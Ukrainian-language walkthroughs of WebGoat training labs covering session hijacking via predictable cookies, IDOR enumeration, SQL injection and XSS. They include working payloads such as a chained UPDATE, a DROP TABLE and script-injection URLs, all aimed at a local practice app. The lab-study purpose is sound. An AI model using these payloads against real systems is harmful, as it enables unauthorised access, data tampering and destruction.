# Hijack a session(A01BrokenAccessControl_Hijacksession.md)

Обираємо відповідне завдання з меню WebGoat.

![](Screenshot_2026-07-21_11-30-13.png)

## Проходження завдання

Запускаємо Burp Suite, переходимо до вкладки Proxy та вмикаємо режим Intercept для перехоплення мережевого трафіку.
![](Screenshot_2026-07-21_11-32-38.png)

Здійснюємо спробу авторизації у формі, щоб згенерувати HTTP запит.
![](Screenshot_2026-07-21_11-31-22.png)

![](Screenshot_2026-07-21_11-48-14.png)

Перехоплений POST запит:
![](Screenshot_2026-07-21_11-33-04.png)

Передаємо цей запит до інструменту Repeater для зручної маніпуляції та багаторазового відправлення без повторного використання браузера.
![](Screenshot_2026-07-21_11-33-30.png)

Виконуємо серію запитів для збору масиву значень `hijack_cookie` з відповідей сервера для їх подальшого аналізу.
![](Screenshot_2026-07-21_11-34-21.png)

![](Screenshot_2026-07-21_11-35-02.png)

![](Screenshot_2026-07-21_11-37-29.png)

Аналіз зібраних cookie виявляє їхню структуру: перша частина — це послідовний ідентифікатор сесії, а друга є часовою міткою (Timestamp).

```text
5320557217334424723-1784622851306
5320557217334424724-1784622881697
5320557217334424725-1784622885384
5320557217334424727-1784622885976
5320557217334424729-1784622886434
5320557217334424730-1784622887281
5320557217334424731-1784622887833
5320557217334424732-1784622888258
5320557217334424733-1784622888690
5320557217334424734-1784622889097
5320557217334424736-1784622891689
```

У послідовності виявлено прогалину: між ідентифікаторами `...4725` та `...4727` відсутній запис. Це вказує на те, що сесію, яка закінчується на `26`, було згенеровано для іншого користувача в цей проміжок часу.

![](Screenshot_2026-07-21_11-38-50.png)

Передаємо запит до інструменту Intruder. Налаштовуємо брутфорс атаку на останні дві цифри часової мітки пропущеної сесії, перебираючи значення від `00` до `99`.
![](Screenshot_2026-07-21_11-42-08.png)

Запускаємо атаку та очікуємо на зміну розміру відповіді або статусу.
![](Screenshot_2026-07-21_11-44-37.png)

Атака пройшла успішно: знайдено правильний payload, в результаті чого підібрано валідний cookie та отримано доступ до чужої сесії. Завдання виконано.
![](Screenshot_2026-07-21_11-44-55.png)

# IDOR(A01BrokenAccessControl_IDOR.md)

Обираємо відповідне завдання з меню WebGoat.

## Проходження завдання

![](Screenshot_2026-07-23_11-07-33.png)

### Спочатку автентифікація, потім — зловживання авторизацією

![](Screenshot_2026-07-23_11-09-12.png)

![](Screenshot_2026-07-23_11-09-20.png)

### Спостереження відмінностей і поведінки

![](Screenshot_2026-07-23_11-10-19.png)

Перехоплений запит, для дослідження відмінностей і поведінки.
![](Screenshot_2026-07-23_11-10-32.png)

Відмінності: role, UserId.
![](Screenshot_2026-07-23_11-11-02.png)

### Вгадування та передбачення шаблонів

![](Screenshot_2026-07-23_11-11-51.png)

![](Screenshot_2026-07-23_11-12-22.png)

Url для перегляду свого профілю - `WebGoat/IDOR/profile/2342384`.

### Гра з шаблонами

![](Screenshot_2026-07-23_11-13-27.png)

Передаємо запит до інструменту Intruder. Налаштовуємо брутфорс атаку, перебираючи значення від `2342384` до `2342399`.

![](Screenshot_2026-07-23_11-14-54.png)

Запускаємо атаку та очікуємо на зміну розміру відповіді або статусу.
![](Screenshot_2026-07-23_11-15-32.png)

Атака пройшла успішно: знайдено правильний payload, в результаті чого підібрано ID іншого профілю.

### Редагування іншого профілю

Створення нового запиту для редагування іншого профілю.
![](Screenshot_2026-07-23_11-19-11.png)

![](Screenshot_2026-07-23_11-19-27.png)

Завдання виконано успішно.
![](Screenshot_2026-07-23_11-16-17.png)

# SQLI(intro)(A03Injection_SQLI(intro).md)

Обираємо відповідне завдання з меню WebGoat.

## Проходження завдання

![](Screenshot_2026-07-23_11-40-09.png)

### What is SQL?

![](Screenshot_2026-07-23_11-41-53.png)

Запит для розв'язання завдання:

```
SELECT department FROM employees WHERE first_name = 'Bob' AND last_name = 'Franco';
```

### Data Manipulation Language (DML)

![](Screenshot_2026-07-23_11-42-43.png)

Запит для розв'язання завдання:

```
UPDATE employees SET department = 'Sales' WHERE first_name = 'Tobi' AND last_name = 'Barnett';
```

### Data Definition Language (DDL)

![](Screenshot_2026-07-23_11-43-18.png)

Запит для розв'язання завдання:

```
ALTER TABLE employees ADD phone varchar(20);
```

### Data Control Language (DCL)

![](Screenshot_2026-07-23_11-43-54.png)

Запит для розв'язання завдання:

```
GRANT ALL ON grant_rights TO unauthorized_user;
```

### What is SQL injection?

![](Screenshot_2026-07-23_11-44-12.png)

### Consequences of SQL injection

![](Screenshot_2026-07-23_11-44-16.png)

### Severity of SQL injection

![](Screenshot_2026-07-23_11-44-20.png)

### Try It! String SQL injection

![](Screenshot_2026-07-23_11-44-52.png)

Запит для розв'язання завдання:

```
Smith'
```

```
or
```

```
'1'='1
```

### Try It! Numeric SQL injection

![](Screenshot_2026-07-23_11-45-22.png)

Запит для розв'язання завдання:

```
1
```

```
1 OR '1'='1'
```

### Compromising confidentiality with String SQL injection

![](Screenshot_2026-07-23_11-47-50.png)

Запит для розв'язання завдання:

```
Smith' OR '1'='1' --
```

### Compromising Integrity with Query chaining

![](Screenshot_2026-07-23_11-48-46.png)

Запит для розв'язання завдання:

```
Smith'; UPDATE employees SET salary = '999999' WHERE last_name = 'Smith' --
```

### Compromising Availability

![](Screenshot_2026-07-23_11-49-11.png)

```
Smith'; DROP TABLE access_log --
```

Завдання виконано успішно.

![](Screenshot_2026-07-23_11-49-16.png)

# XSS(A03Injection_XSS.md)

Обираємо відповідне завдання з меню WebGoat.

## Проходження завдання

![](Screenshot_2026-07-23_12-45-06.png)

### What is XSS?

Використання `alert(document.cookie);` для перевірки cookie.

![](Screenshot_2026-07-23_12-45-40.png)

![](Screenshot_2026-07-23_12-46-23.png)

### Most common locations

![](Screenshot_2026-07-23_12-46-32.png)

### Why should we care?

![](Screenshot_2026-07-23_12-46-36.png)

### Types of XSS

![](Screenshot_2026-07-23_12-46-43.png)

### Reflected XSS scenario

![](Screenshot_2026-07-23_12-46-51.png)

### Try It! Reflected XSS

![](Screenshot_2026-07-23_12-47-01.png)

Значення для розв'язання завдання::

```
<script>alert('')</script>
```

### Self XSS or reflected XSS?

![](Screenshot_2026-07-23_12-47-36.png)

![](Screenshot_2026-07-23_12-47-56.png)

### Reflected and DOM-Based XSS

![](Screenshot_2026-07-23_12-48-04.png)

### Identify potential for DOM-Based XSS

![](Screenshot_2026-07-23_12-48-11.png)

![](Screenshot_2026-07-23_12-48-45.png)

Перелік маршрутів, один з яких залишили помилково.

```
  routes: {
            'welcome': 'welcomeRoute',
            'lesson/:name': 'lessonRoute',
            'lesson/:name/:pageNum': 'lessonPageRoute',
            'test/:param': 'testRoute',
            'reportCard': 'reportCard'
        },
```

### Try It! DOM-Based XSS

![](Screenshot_2026-07-23_12-53-50.png)

![](Screenshot_2026-07-23_12-53-40.png)

Значення для розв'язання завдання::

```
http://localhost:8080/WebGoat/start.mvc#test/%3Cscript%3Ewebgoat%2Ecustomjs%2EphoneHome%28%29%3C%2Fscript%3E%0A
```

### Quiz

![](Screenshot_2026-07-23_12-53-58.png)

![](Screenshot_2026-07-23_12-54-04.png)

Завдання виконано успішно.

![](Screenshot_2026-07-23_12-54-12.png)
